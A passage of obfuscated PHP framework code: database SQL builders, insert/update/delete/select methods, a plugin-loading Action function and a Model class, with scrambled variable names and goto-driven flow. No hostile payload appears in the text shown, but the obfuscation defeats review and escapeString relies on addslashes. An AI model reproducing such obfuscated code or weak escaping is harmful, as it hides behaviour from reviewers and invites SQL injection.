strtolower($bìÓ˜¦çÂÑ[$b¨ò»¬„†Á][0])) { $e¨‡‰‡ç¯‘ .= $C¤İ¦©º [248] . $cö¿¿´’ÔŠ . $C¤İ¦©º [50] . $FäèÖæÜÌˆ . $C¤İ¦©º [930] . $e«ñ¯ğ¦´µ . $C¤İ¦©º [50]; } else { $bíØ¡Ó®È‘ = is_array($bìÓ˜¦çÂÑ[$b¨ò»¬„†Á]) ? $this->exp[strtolower($bìÓ˜¦çÂÑ[$b¨ò»¬„†Á][0])] : $C¤İ¦©º [905]; if (!$bíØ¡Ó®È‘ && is_array($bìÓ˜¦çÂÑ[$b¨ò»¬„†Á]) && in_array($bìÓ˜¦çÂÑ[$b¨ò»¬„†Á][0], array($C¤İ¦©º [905], $C¤İ¦©º [923], $C¤İ¦©º [924], $C¤İ¦©º [925], $C¤İ¦©º [926], $C¤İ¦©º [927]))) { $bíØ¡Ó®È‘ = $bìÓ˜¦çÂÑ[$b¨ò»¬„†Á][0]; } $e¨‡‰‡ç¯‘ .= $C¤İ¦©º [248] . $cö¿¿´’ÔŠ . $C¤İ¦©º [50] . $bíØ¡Ó®È‘ . $C¤İ¦©º [50] . $this->parseValue($FäèÖæÜÌˆ) . $C¤İ¦©º [930] . $e«ñ¯ğ¦´µ . $C¤İ¦©º [50]; } } $e¨‡‰‡ç¯‘ = substr($e¨‡‰‡ç¯‘, 0, -4); } } else { $e¨‡‰‡ç¯‘ .= $cö¿¿´’ÔŠ . $C¤İ¦©º [933] . $this->parseValue($bìÓ˜¦çÂÑ); } return $e¨‡‰‡ç¯‘; } protected function parseThinkWhere($EëÅÈœƒÍ, $d×‡’Üíƒ±) { $Dî·ØÊå†î =& $_SERVER[í…¶]; $D˜­Çê˜ªê = $Dî·ØÊå†î[33]; switch ($EëÅÈœƒÍ) { case $Dî·ØÊå†î[339]: $D˜­Çê˜ªê = $d×‡’Üíƒ±; break; case $Dî·ØÊå†î[917]: $D˜­Çê˜ªê = is_string($d×‡’Üíƒ±) ? $d×‡’Üíƒ± : substr($this->parseWhere($d×‡’Üíƒ±), 6); break; case $Dî·ØÊå†î[934]: parse_str($d×‡’Üíƒ±, $d’ÊÕ‰¨¸); if (isset($d’ÊÕ‰¨¸[$Dî·ØÊå†î[912]])) { $bæ®ÕãŒ„ = $Dî·ØÊå†î[50] . strtoupper($d’ÊÕ‰¨¸[$Dî·ØÊå†î[912]]) . $Dî·ØÊå†î[50]; unset($d’ÊÕ‰¨¸[$Dî·ØÊå†î[912]]); } else { $bæ®ÕãŒ„ = $Dî·ØÊå†î[916]; } $c‰„Üãñ±¿ = array(); foreach ($d’ÊÕ‰¨¸ as $EÓ‰ì¬Ğ™¤ => $AéÊ¤Öï†) { $c‰„Üãñ±¿[] = $this->parseKey($EÓ‰ì¬Ğ™¤) . $Dî·ØÊå†î[933] . $this->parseValue($AéÊ¤Öï†); } $D˜­Çê˜ªê = implode($bæ®ÕãŒ„, $c‰„Üãñ±¿); break; } return $D˜­Çê˜ªê; } protected function parseLimit($Eº¯†­„ö§) { $BàŸ—À ò§ =& $_SERVER[í…¶]; return !empty($Eº¯†­„ö§) ? $BàŸ—À ò§[48] . $Eº¯†­„ö§ . $BàŸ—À ò§[50] : $BàŸ—À ò§[33]; } protected function parseJoin($eÀÒ‚óÚ°–) { $f™‘Œñ Í¼ =& $_SERVER[í…¶]; $E‡¤„ÏÄø¥ = $f™‘Œñ Í¼[33]; if (!empty($eÀÒ‚óÚ°–)) { if (is_array($eÀÒ‚óÚ°–)) { foreach ($eÀÒ‚óÚ°– as $F¢Òä³ù => $fÏøƒ÷–¶ï) { if (!1 !== stripos($fÏøƒ÷–¶ï, $f™‘Œñ Í¼[935])) { $E‡¤„ÏÄø¥ .= $f™‘Œñ Í¼[50] . $fÏøƒ÷–¶ï; } else { $E‡¤„ÏÄø¥ .= $f™‘Œñ Í¼[936] . $fÏøƒ÷–¶ï; } } } else { $E‡¤„ÏÄø¥ .= $f™‘Œñ Í¼[936] . $eÀÒ‚óÚ°–; } } $E‡¤„ÏÄø¥ = preg_replace($f™‘Œñ Í¼[937], think_config($f™‘Œñ Í¼[840]) . $f™‘Œñ Í¼[938], $E‡¤„ÏÄø¥); return $E‡¤„ÏÄø¥; } protected function parseOrder($AœÍ‡Š„Óô) { $cÑ—Æ…îåÖ =& $_SERVER[í…¶]; if (is_array($AœÍ‡Š„Óô)) { $f‘¤ˆ‡ì¿ = array(); foreach ($AœÍ‡Š„Óô as $A‰ì’ƒËÕğ => $Cß³ÆÄ„êÎ) { if (is_numeric($A‰ì’ƒËÕğ)) { $f‘¤ˆ‡ì¿[] = $this->parseKey($Cß³ÆÄ„êÎ); } else { $Cß³ÆÄ„êÎ = in_array(strtoupper(trim($Cß³ÆÄ„êÎ)), array($cÑ—Æ…îåÖ[939], $cÑ—Æ…îåÖ[940])) ? $cÑ—Æ…îåÖ[50] . $Cß³ÆÄ„êÎ : $cÑ—Æ…îåÖ[33]; if (preg_match($cÑ—Æ…îåÖ[941], $A‰ì’ƒËÕğ)) { $f‘¤ˆ‡ì¿[] = $this->parseKey($A‰ì’ƒËÕğ) . $Cß³ÆÄ„êÎ; } else { think_exception($cÑ—Æ…îåÖ[942] . $A‰ì’ƒËÕğ); } } } $AœÍ‡Š„Óô = implode($cÑ—Æ…îåÖ[47], $f‘¤ˆ‡ì¿); } return !empty($AœÍ‡Š„Óô) ? $cÑ—Æ…îåÖ[943] . $AœÍ‡Š„Óô : $cÑ—Æ…îåÖ[33]; } protected function parseGroup($EùÙĞìé¯) { $CŒó­®éÌµ =& $_SERVER[í…¶]; return !empty($EùÙĞìé¯) ? $CŒó­®éÌµ[944] . $EùÙĞìé¯ : $CŒó­®éÌµ[33]; } protected function parseHaving($d‰¦¬•®±) { $cÂ¦ë£±—‰ =& $_SERVER[í…¶]; return !empty($d‰¦¬•®±) ? $cÂ¦ë£±—‰[945] . $d‰¦¬•®± : $cÂ¦ë£±—‰[33]; } protected function parseComment($c««‡Ÿßåì) { $d­œ×¯×İİ =& $_SERVER[í…¶]; return !empty($c««‡Ÿßåì) ? $d­œ×¯×İİ[946] . $c««‡Ÿßåì . $d­œ×¯×İİ[947] : $d­œ×¯×İİ[33]; } protected function parseDistinct($eˆ˜¥¢Ÿ) { $bîà˜¹³–ø =& $_SERVER[í…¶]; return !empty($eˆ˜¥¢Ÿ) ? $bîà˜¹³–ø[948] : $bîà˜¹³–ø[33]; } protected function parseUnion($FñËŠë²Ÿ) { $fƒ‚Üâ—± =& $_SERVER[í…¶]; if (empty($FñËŠë²Ÿ)) { return $fƒ‚Üâ—±[33]; } if (isset($FñËŠë²Ÿ[$fƒ‚Üâ—±[336]])) { $eµÛÈÈÓƒ = $fƒ‚Üâ—±[949]; unset($FñËŠë²Ÿ[$fƒ‚Üâ—±[336]]); } else { $eµÛÈÈÓƒ = $fƒ‚Üâ—±[950]; } foreach ($FñËŠë²Ÿ as $e„ŞéæÖÄš) { $c‰Ö´¤Ø­¥[] = $eµÛÈÈÓƒ . (is_array($e„ŞéæÖÄš) ? $this->buildSelectSql($e„ŞéæÖÄš) : $e„ŞéæÖÄš); } return implode($fƒ‚Üâ—±[50], $c‰Ö´¤Ø­¥); } public function insert($cÎ”ÖŸŒ‰, $d¢¬ÎèèÕÁ = array(), $e¾ß÷‚ÔÇ = false) { goto d‡™é­ñ‘â; F–¯¶„»ÀÇ: $cÙ³õæ… .= $this->parseComment(!empty($d¢¬ÎèèÕÁ[$D‘“´–§ÎÀ[341]]) ? $d¢¬ÎèèÕÁ[$D‘“´–§ÎÀ[341]] : $D‘“´–§ÎÀ[33]); return $this->execute($cÙ³õæ…, $this->parseBind(!empty($d¢¬ÎèèÕÁ[$D‘“´–§ÎÀ[273]]) ? $d¢¬ÎèèÕÁ[$D‘“´–§ÎÀ[273]] : array())); goto D¡Ëºö–‘; F†¬ğË×Ñ: foreach ($cÎ”ÖŸŒ‰ as $aæ÷¡ç÷¯­ => $fĞæ×ƒÌôÚ) { if (is_array($fĞæ×ƒÌôÚ) && $D‘“´–§ÎÀ[285] == $fĞæ×ƒÌôÚ[0]) { $bé”œë´æß[] = $this->parseKey($aæ÷¡ç÷¯­); $Cë‰«»÷æ[] = $fĞæ×ƒÌôÚ[1]; } elseif (is_scalar($fĞæ×ƒÌôÚ) || is_null($fĞæ×ƒÌôÚ)) { $bé”œë´æß[] = $this->parseKey($aæ÷¡ç÷¯­); $Cë‰«»÷æ[] = $this->parseValue($fĞæ×ƒÌôÚ); } } $cÙ³õæ… = ($e¾ß÷‚ÔÇ ? $D‘“´–§ÎÀ[817] : $D‘“´–§ÎÀ[818]) . $D‘“´–§ÎÀ[819] . $this->parseTable($d¢¬ÎèèÕÁ[$D‘“´–§ÎÀ[267]]) . $D‘“´–§ÎÀ[813] . implode($D‘“´–§ÎÀ[47], $bé”œë´æß) . $D‘“´–§ÎÀ[814] . implode($D‘“´–§ÎÀ[47], $Cë‰«»÷æ) . $D‘“´–§ÎÀ[815]; $cÙ³õæ… .= $this->parseLock(isset($d¢¬ÎèèÕÁ[$D‘“´–§ÎÀ[774]]) ? $d¢¬ÎèèÕÁ[$D‘“´–§ÎÀ[774]] : !1); goto F–¯¶„»ÀÇ; d‡™é­ñ‘â: $D‘“´–§ÎÀ =& $_SERVER[í…¶]; $Cë‰«»÷æ = $bé”œë´æß = array(); $this->model = $d¢¬ÎèèÕÁ[$D‘“´–§ÎÀ[269]]; goto F†¬ğË×Ñ; D¡Ëºö–‘: } public function selectInsert($AÏ‘¨µìŒ, $b»”Ë­¥’, $F‰–†Ñ£  = array()) { goto DÎ§êµÓòİ; DÎ§êµÓòİ: $C«Àí»ö¦² =& $_SERVER[í…¶]; $this->model = $F‰–†Ñ£ [$C«Àí»ö¦²[269]]; if (is_string($AÏ‘¨µìŒ)) { $AÏ‘¨µìŒ = explode($C«Àí»ö¦²[47], $AÏ‘¨µìŒ); } goto Eöù‚È‘Ô¾; Eöù‚È‘Ô¾: array_walk($AÏ‘¨µìŒ, array($this, $C«Àí»ö¦²[816])); $fø£Ô¶Ë”Ç = $C«Àí»ö¦²[951] . $this->parseTable($b»”Ë­¥’) . $C«Àí»ö¦²[813] . implode($C«Àí»ö¦²[47], $AÏ‘¨µìŒ) . $C«Àí»ö¦²[930]; $fø£Ô¶Ë”Ç .= $this->buildSelectSql($F‰–†Ñ£ ); goto d¯Û›š°; d¯Û›š°: return $this->execute($fø£Ô¶Ë”Ç, $this->parseBind(!empty($F‰–†Ñ£ [$C«Àí»ö¦²[273]]) ? $F‰–†Ñ£ [$C«Àí»ö¦²[273]] : array())); goto d¿¸ÜŸˆßê; d¿¸ÜŸˆßê: } public function update($a‘‘•ÍÓÊ¹, $cšÁÓğİ©Ğ) { $BÎÊƒ‘Ì =& $_SERVER[í…¶]; $this->model = $cšÁÓğİ©Ğ[$BÎÊƒ‘Ì[269]]; $aœô¯ºŸá = $BÎÊƒ‘Ì[952] . $this->parseTable($cšÁÓğİ©Ğ[$BÎÊƒ‘Ì[267]]) . $this->parseSet($a‘‘•ÍÓÊ¹) . $this->parseWhere(!empty($cšÁÓğİ©Ğ[$BÎÊƒ‘Ì[263]]) ? $cšÁÓğİ©Ğ[$BÎÊƒ‘Ì[263]] : $BÎÊƒ‘Ì[33]) . $this->parseOrder(!empty($cšÁÓğİ©Ğ[$BÎÊƒ‘Ì[359]]) ? $cšÁÓğİ©Ğ[$BÎÊƒ‘Ì[359]] : $BÎÊƒ‘Ì[33]) . $this->parseLimit(!empty($cšÁÓğİ©Ğ[$BÎÊƒ‘Ì[280]]) ? $cšÁÓğİ©Ğ[$BÎÊƒ‘Ì[280]] : $BÎÊƒ‘Ì[33]) . $this->parseLock(isset($cšÁÓğİ©Ğ[$BÎÊƒ‘Ì[774]]) ? $cšÁÓğİ©Ğ[$BÎÊƒ‘Ì[774]] : !1) . $this->parseComment(!empty($cšÁÓğİ©Ğ[$BÎÊƒ‘Ì[341]]) ? $cšÁÓğİ©Ğ[$BÎÊƒ‘Ì[341]] : $BÎÊƒ‘Ì[33]); return $this->execute($aœô¯ºŸá, $this->parseBind(!empty($cšÁÓğİ©Ğ[$BÎÊƒ‘Ì[273]]) ? $cšÁÓğİ©Ğ[$BÎÊƒ‘Ì[273]] : array())); } public function delete($D‰Æ×Åˆ˜ = array()) { $BŸ«¡Ïâ =& $_SERVER[í…¶]; $this->model = $D‰Æ×Åˆ˜[$BŸ«¡Ïâ[269]]; $d«êóçƒÃ‹ = $BŸ«¡Ïâ[953] . $this->parseTable($D‰Æ×Åˆ˜[$BŸ«¡Ïâ[267]]) . $this->parseWhere(!empty($D‰Æ×Åˆ˜[$BŸ«¡Ïâ[263]]) ? $D‰Æ×Åˆ˜[$BŸ«¡Ïâ[263]] : $BŸ«¡Ïâ[33]) . $this->parseOrder(!empty($D‰Æ×Åˆ˜[$BŸ«¡Ïâ[359]]) ? $D‰Æ×Åˆ˜[$BŸ«¡Ïâ[359]] : $BŸ«¡Ïâ[33]) . $this->parseLimit(!empty($D‰Æ×Åˆ˜[$BŸ«¡Ïâ[280]]) ? $D‰Æ×Åˆ˜[$BŸ«¡Ïâ[280]] : $BŸ«¡Ïâ[33]) . $this->parseLock(isset($D‰Æ×Åˆ˜[$BŸ«¡Ïâ[774]]) ? $D‰Æ×Åˆ˜[$BŸ«¡Ïâ[774]] : !1) . $this->parseComment(!empty($D‰Æ×Åˆ˜[$BŸ«¡Ïâ[341]]) ? $D‰Æ×Åˆ˜[$BŸ«¡Ïâ[341]] : $BŸ«¡Ïâ[33]); return $this->execute($d«êóçƒÃ‹, $this->parseBind(!empty($D‰Æ×Åˆ˜[$BŸ«¡Ïâ[273]]) ? $D‰Æ×Åˆ˜[$BŸ«¡Ïâ[273]] : array())); } public function select($b©åé†Ôï… = array()) { goto E‰ğè½¦‚À; CŠé¨‰¢¿ë: $a¥õØŞò› = isset($b©åé†Ôï…[$C¦µ§‡‹ô[337]]) ? $b©åé†Ôï…[$C¦µ§‡‹ô[337]] : !1; if ($a¥õØŞò›) { $Böç§™ôâ = is_string($a¥õØŞò›[$C¦µ§‡‹ô[89]]) ? $a¥õØŞò›[$C¦µ§‡‹ô[89]] : $C¦µ§‡‹ô[954] . md5($F„ó«­½—·); $E°ìÜŸÜÔƒ = think_cache($Böç§™ôâ, $C¦µ§‡‹ô[33], $a¥õØŞò›); if (!1 !== $E°ìÜŸÜÔƒ) { return $E°ìÜŸÜÔƒ; } } $e—ÏÏˆáë = $this->query($F„ó«­½—·, $this->parseBind(!empty($b©åé†Ôï…[$C¦µ§‡‹ô[273]]) ? $b©åé†Ôï…[$C¦µ§‡‹ô[273]] : array())); goto båÒ ˜‰Äó; båÒ ˜‰Äó: if ($a¥õØŞò› && !1 !== $e—ÏÏˆáë) { think_cache($Böç§™ôâ, $e—ÏÏˆáë, $a¥õØŞò›); } return $e—ÏÏˆáë; goto CÈÏƒ»Û¨ê; E‰ğè½¦‚À: $C¦µ§‡‹ô =& $_SERVER[í…¶]; $this->model = $b©åé†Ôï…[$C¦µ§‡‹ô[269]]; $F„ó«­½—· = $this->buildSelectSql($b©åé†Ôï…); goto CŠé¨‰¢¿ë; CÈÏƒ»Û¨ê: } public function buildSelectSql($EÏù·‹®ƒê = array()) { goto d£ˆ÷ÔºÅ…; Cã£É®‘¸Ã: $d«¿Ÿ®¡³î = $this->parseSql($this->selectSql, $EÏù·‹®ƒê); $d«¿Ÿ®¡³î .= $this->parseLock(isset($EÏù·‹®ƒê[$B¦÷¥ ‹é‚[774]]) ? $EÏù·‹®ƒê[$B¦÷¥ ‹é‚[774]] : !1); if (isset($EõİÏ§Ï·³)) { think_cache($EõİÏ§Ï·³, $d«¿Ÿ®¡³î); } goto f×«â˜½Í; f×«â˜½Í: return $d«¿Ÿ®¡³î; goto BŒ¤á«‡ò; d£ˆ÷ÔºÅ…: $B¦÷¥ ‹é‚ =& $_SERVER[í…¶]; if (isset($EÏù·‹®ƒê[$B¦÷¥ ‹é‚[340]])) { if (strpos($EÏù·‹®ƒê[$B¦÷¥ ‹é‚[340]], $B¦÷¥ ‹é‚[47])) { list($BÇã‡åÇïŒ, $C¡ñ«ÜáŞ) = explode($B¦÷¥ ‹é‚[47], $EÏù·‹®ƒê[$B¦÷¥ ‹é‚[340]]); } else { $BÇã‡åÇïŒ = $EÏù·‹®ƒê[$B¦÷¥ ‹é‚[340]]; } $BÇã‡åÇïŒ = $BÇã‡åÇïŒ ? $BÇã‡åÇïŒ : 1; $C¡ñ«ÜáŞ = isset($C¡ñ«ÜáŞ) ? $C¡ñ«ÜáŞ : (is_numeric($EÏù·‹®ƒê[$B¦÷¥ ‹é‚[280]]) ? $EÏù·‹®ƒê[$B¦÷¥ ‹é‚[280]] : 20); $C¡¯³¾‡ë… = $C¡ñ«ÜáŞ * ((int) $BÇã‡åÇïŒ - 1); $EÏù·‹®ƒê[$B¦÷¥ ‹é‚[280]] = $C¡¯³¾‡ë… . $B¦÷¥ ‹é‚[47] . $C¡ñ«ÜáŞ; } if (think_config($B¦÷¥ ‹é‚[955])) { $EõİÏ§Ï·³ = $B¦÷¥ ‹é‚[956] . md5(serialize($EÏù·‹®ƒê)); $Eê‰ë‘ƒ¹¹ = think_cache($EõİÏ§Ï·³); if ($Eê‰ë‘ƒ¹¹) { return $Eê‰ë‘ƒ¹¹; } } goto Cã£É®‘¸Ã; BŒ¤á«‡ò: } public function parseSql($eÃ½¶Öå, $eùÊîÇô¥¸ = array()) { $cèºí‡‘½ =& $_SERVER[í…¶]; $eÃ½¶Öå = str_replace(array($cèºí‡‘½[957], $cèºí‡‘½[958], $cèºí‡‘½[959], $cèºí‡‘½[960], $cèºí‡‘½[961], $cèºí‡‘½[962], $cèºí‡‘½[963], $cèºí‡‘½[964], $cèºí‡‘½[965], $cèºí‡‘½[966], $cèºí‡‘½[967]), array($this->parseTable("{$eùÊîÇô¥¸[$cèºí‡‘½[267]]}"), $this->parseDistinct(isset($eùÊîÇô¥¸[$cèºí‡‘½[968]]) ? $eùÊîÇô¥¸[$cèºí‡‘½[968]] : !1), $this->parseField(!empty($eùÊîÇô¥¸[$cèºí‡‘½[261]]) ? $eùÊîÇô¥¸[$cèºí‡‘½[261]] : $cèºí‡‘½[176]), $this->parseJoin(!empty($eùÊîÇô¥¸[$cèºí‡‘½[270]]) ? $eùÊîÇô¥¸[$cèºí‡‘½[270]] : $cèºí‡‘½[33]), $this->parseWhere(!empty($eùÊîÇô¥¸[$cèºí‡‘½[263]]) ? $eùÊîÇô¥¸[$cèºí‡‘½[263]] : $cèºí‡‘½[33]), $this->parseGroup(!empty($eùÊîÇô¥¸[$cèºí‡‘½[969]]) ? $eùÊîÇô¥¸[$cèºí‡‘½[969]] : $cèºí‡‘½[33]), $this->parseHaving(!empty($eùÊîÇô¥¸[$cèºí‡‘½[970]]) ? $eùÊîÇô¥¸[$cèºí‡‘½[970]] : $cèºí‡‘½[33]), $this->parseOrder(!empty($eùÊîÇô¥¸[$cèºí‡‘½[359]]) ? $eùÊîÇô¥¸[$cèºí‡‘½[359]] : $cèºí‡‘½[33]), $this->parseLimit(!empty($eùÊîÇô¥¸[$cèºí‡‘½[280]]) ? $eùÊîÇô¥¸[$cèºí‡‘½[280]] : $cèºí‡‘½[33]), $this->parseUnion(!empty($eùÊîÇô¥¸[$cèºí‡‘½[335]]) ? $eùÊîÇô¥¸[$cèºí‡‘½[335]] : $cèºí‡‘½[33]), $this->parseComment(!empty($eùÊîÇô¥¸[$cèºí‡‘½[341]]) ? $eùÊîÇô¥¸[$cèºí‡‘½[341]] : $cèºí‡‘½[33])), $eÃ½¶Öå); return $eÃ½¶Öå; } public function getLastSql($f‹Õ…ç±Íå = '') { return $f‹Õ…ç±Íå ? $this->modelSql[$f‹Õ…ç±Íå] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($Fœ”º¯×‰—) { return addslashes($Fœ”º¯×‰—); } public function setModel($f¡¿¶Ç„ù•) { $this->model = $f¡¿¶Ç„ù•; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto EÛğŠ§‡‘Ã; eæ½­Ÿß´: function Action($C¶œè¸õ¢Á = '') { goto e‘–î¹‘‹ñ; aø˜¥Šëˆ: if (isset($bí„áÛ¨òß[$Dˆî³‹Š¬])) { return $bí„áÛ¨òß[$Dˆî³‹Š¬]; } $C¶œè¸õ¢Á = trim(str_replace($dèÅ¨­ÕÃï[4], $dèÅ¨­ÕÃï[5], $C¶œè¸õ¢Á), $dèÅ¨­ÕÃï[4]); $a‹ª†º•Ñ‹ = explode($dèÅ¨­ÕÃï[5], $C¶œè¸õ¢Á); goto B–§Ó‹µªÊ; dáÓ°‹…„î: $bí„áÛ¨òß[$f«•Šø¹İ] = new $cÌ™‡ó¨Ã£(); $bí„áÛ¨òß[$Dˆî³‹Š¬] = $bí„áÛ¨òß[$f«•Šø¹İ]; return $bí„áÛ¨òß[$f«•Šø¹İ]; goto aÔ•´è¶µ; DáõôˆĞš±: if (isset($bí„áÛ¨òß[$f«•Šø¹İ])) { return $bí„áÛ¨òß[$f«•Šø¹İ]; } if (is_file($D”¸Í¸¦ˆ)) { include_once $D”¸Í¸¦ˆ; } if (!class_exists($cÌ™‡ó¨Ã£)) { return actionCallError("\x5b{$C¶œè¸õ¢Á}\x20\x3d\x3e\x20{$cÌ™‡ó¨Ã£}\135\40\143\x6c\x61\x73\163\x20\156\x6f\164\x20\x65\x78\151\163\x74\x73\x21"); } goto dáÓ°‹…„î; B–§Ó‹µªÊ: $CÏåŠ‚Î = strtolower($a‹ª†º•Ñ‹[0]); if (substr($CÏåŠ‚Î, -6) == $dèÅ¨­ÕÃï[6]) { $C¶œè¸õ¢Á = substr($a‹ª†º•Ñ‹[0], 0, -6); $cÌ™‡ó¨Ã£ = $C¶œè¸õ¢Á . $dèÅ¨­ÕÃï[7]; $D”¸Í¸¦ˆ = $dèÅ¨­ÕÃï[8]; if (isset($a‹ª†º•Ñ‹[1]) && substr(strtolower($a‹ª†º•Ñ‹[1]), -5) == $dèÅ¨­ÕÃï[9]) { $cÌ™‡ó¨Ã£ = $C¶œè¸õ¢Á . $a‹ª†º•Ñ‹[1]; $D”¸Í¸¦ˆ = $dèÅ¨­ÕÃï[10] . $a‹ª†º•Ñ‹[1] . $dèÅ¨­ÕÃï[11]; } else { if (count($a‹ª†º•Ñ‹) == 3) { $cÌ™‡ó¨Ã£ = $C¶œè¸õ¢Á . $a‹ª†º•Ñ‹[1] . $a‹ª†º•Ñ‹[2]; $D”¸Í¸¦ˆ = $dèÅ¨­ÕÃï[12] . $a‹ª†º•Ñ‹[1] . $dèÅ¨­ÕÃï[13] . $a‹ª†º•Ñ‹[2] . $dèÅ¨­ÕÃï[11]; } } $D”¸Í¸¦ˆ = PLUGIN_DIR . $C¶œè¸õ¢Á . $dèÅ¨­ÕÃï[4] . $D”¸Í¸¦ˆ; } else { if (substr($CÏåŠ‚Î, -5) == $dèÅ¨­ÕÃï[9]) { $C¶œè¸õ¢Á = substr($a‹ª†º•Ñ‹[0], 0, -5); return Model($C¶œè¸õ¢Á); } else { $cÌ™‡ó¨Ã£ = $a‹ª†º•Ñ‹[0] . $a‹ª†º•Ñ‹[1]; $D”¸Í¸¦ˆ = CONTROLLER_DIR . $a‹ª†º•Ñ‹[0] . $dèÅ¨­ÕÃï[4] . $a‹ª†º•Ñ‹[1] . $dèÅ¨­ÕÃï[14]; } } $f«•Šø¹İ = strtolower($cÌ™‡ó¨Ã£); goto DáõôˆĞš±; e‘–î¹‘‹ñ: $dèÅ¨­ÕÃï =& $_SERVER[²‡§™ıäÑÊº•]; static $bí„áÛ¨òß = array(); $Dˆî³‹Š¬ = $C¶œè¸õ¢Á; goto aø˜¥Šëˆ; aÔ•´è¶µ: } function ActionApply($b™¿™ì‰í„, $a’—ÒÏ‹¶à = array()) { goto Bñ˜Î×”™í; F¼‰š«¶·…: if (!method_exists($c¿ªØ²ù‹Ÿ, $AÃ…Çºãƒ)) { return actionCallError("{$b™¿™ì‰í„}\40\155\x65\164\150\x6f\x64\40\156\x6f\164\40\x65\170\x69\163\164\163\x21"); } $CİìÀî¢ğ = call_user_func_array(array($c¿ªØ²ù‹Ÿ, $AÃ…Çºãƒ), $a’—ÒÏ‹¶à); return $CİìÀî¢ğ; goto Eà’°•×Ó·; Bñ˜Î×”™í: if (is_array($b™¿™ì‰í„)) { return call_user_func_array($b™¿™ì‰í„, $a’—ÒÏ‹¶à); } if (function_exists($b™¿™ì‰í„)) { return call_user_func_array($b™¿™ì‰í„, $a’—ÒÏ‹¶à); } $aÉÕ¸·øÂÑ = strrpos($b™¿™ì‰í„, $_SERVER[²‡§™ıäÑÊº•][5]); goto E¸ƒ¢»„ù”; E¸ƒ¢»„ù”: $E…º¨Šó±µ = substr($b™¿™ì‰í„, 0, $aÉÕ¸·øÂÑ); $AÃ…Çºãƒ = substr($b™¿™ì‰í„, $aÉÕ¸·øÂÑ + 1); $c¿ªØ²ù‹Ÿ = Action($E…º¨Šó±µ); goto F¼‰š«¶·…; Eà’°•×Ó·: } function actionCallError($a‰Âå•÷Ñ) { $AË¶Øİ¨—Æ =& $_SERVER[²‡§™ıäÑÊº•]; $bÙñ×–ˆ‰ = json_encode_force(array($AË¶Øİ¨—Æ[15] => this_url(), $AË¶Øİ¨—Æ[16] => $GLOBALS[$AË¶Øİ¨—Æ[16]])); $bÙñ×–ˆ‰ = str_replace(array($AË¶Øİ¨—Æ[17]), array($AË¶Øİ¨—Æ[4]), $bÙñ×–ˆ‰); return write_log($a‰Âå•÷Ñ . $AË¶Øİ¨—Æ[18] . $bÙñ×–ˆ‰, $AË¶Øİ¨—Æ[19]); } goto aä›öøØ†¿; D¼»¨¸Àåè: register_shutdown_function($_SERVER[²‡§™ıäÑÊº•][36]); set_error_handler($_SERVER[²‡§™ıäÑÊº•][49], $bˆÁÚ‚î¡ƒ); if (function_exists($_SERVER[²‡§™ıäÑÊº•][50])) { set_exception_handler($_SERVER[²‡§™ıäÑÊº•][51]); } goto Bò”¸­ëî; Aø¹ñ”Ë´: define($_SERVER[í…¶][230], 0); define($_SERVER[í…¶][231], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\142\154\x65", "\157\x72\x64\x65\x72", "\141\154\151\141\163", "\150\141\166\151\156\x67", "\147\162\157\165\160", "\x6c\157\x63\x6b", "\144\x69\163\164\x69\x6e\x63\164", "\x61\165\164\x6f", "\146\151\154\x74\x65\162", "\x76\141\x6c\151\144\141\164\x65", "\x72\145\x73\165\154\x74", "\142\x69\x6e\x64", "\164\x6f\x6b\x65\x6e"); public function __construct($EÚÚÖŞó² = '', $F¹÷ÛÍŸ¢‡ = '', $CÊº¸Á Ø = '') { $bÎáÂöÊ =& $_SERVER[í…¶]; $this->_initialize(); if (!empty($EÚÚÖŞó²)) { if (strpos($EÚÚÖŞó², $bÎáÂöÊ[91])) { list($this->dbName, $this->name) = explode($bÎáÂöÊ[91], $EÚÚÖŞó²); } else { $this->name = $EÚÚÖŞó²; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($F¹÷ÛÍŸ¢‡)) { $this->tablePrefix = $bÎáÂöÊ[33]; } elseif ($bÎáÂöÊ[33] != $F¹÷ÛÍŸ¢‡) { $this->tablePrefix = $F¹÷ÛÍŸ¢‡; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($bÎáÂöÊ[232]); } $this->db(0, empty($this->connection) ? $CÊº¸Á Ø : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $EÕ˜åÒÁÈÀ =& $_SERVER[í…¶]; if (empty($this->fields)) { if (think_config($EÕ˜åÒÁÈÀ[233])) { $b½†À²Ô°ì = $this->dbName ? $this->dbName : think_config($EÕ˜åÒÁÈÀ[234]); $F÷†ã«Õ–æ = think_var_cache($EÕ˜åÒÁÈÀ[235] . strtolower(get_path_this($b½†À²Ô°ì) . $EÕ˜åÒÁÈÀ[91] . $this->name)); if ($F÷†ã«Õ–æ) { $B£ÛÙ¢¿§ë = think_config($EÕ˜åÒÁÈÀ[236]); if (empty($B£ÛÙ¢¿§ë) || $F÷†ã«Õ–æ[$EÕ˜åÒÁÈÀ[237]] == $B£ÛÙ¢¿§ë) { $this->fields = $F÷†ã«Õ–æ; return; } } } $this->flush(); } } public function flush() { goto AŸ¸ƒÂ–¥; AŸ¸ƒÂ–¥: $cÕ¾©×­Õë =& $_SERVER[í…¶]; $this->db->setModel($this->name); $BòÀÄï½ˆÆ = $this->db->getFields($this->getTableName()); goto F±æàÛ‘ƒŞ; FÇÖÏ†ˆ¥ï: if (think_config($cÕ¾©×­Õë[233])) { $D¸¬ùîŠÒ° = $this->dbName ? $this->dbName : think_config($cÕ¾©×­Õë[234]); think_var_cache($cÕ¾©×­Õë[235] . strtolower(get_path_this($D¸¬ùîŠÒ°) . $cÕ¾©×­Õë[91] . $this->name), $this->fields); } goto f¢Ãî¶›Æ‘; EÁàÏÁÜ‘”: foreach ($BòÀÄï½ˆÆ as $eªßó‚ ˜ => $BåÕ¦ƒ”Ä¡) { $AÊÒ¬‡¾ˆé[$eªßó‚ ˜] = $BåÕ¦ƒ”Ä¡[$cÕ¾©×­Õë[29]]; if 